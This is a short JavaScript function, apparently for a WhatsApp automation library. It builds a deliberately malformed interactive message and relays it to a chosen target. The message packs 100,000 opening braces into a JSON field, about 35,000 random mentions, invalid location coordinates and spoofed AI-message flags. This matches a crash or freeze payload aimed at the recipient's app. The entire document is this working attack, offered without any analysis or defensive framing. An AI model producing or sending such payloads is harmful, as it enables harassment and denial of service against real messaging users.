async function ViSiXFC(client, target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              liveLocationMessage: {
               degreesLatitude: -999.035,
               degreesLongitude: 922.999999999999,
                name: "",
                address: "1.1.1.1.1.1",
              },
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 35000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 500000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

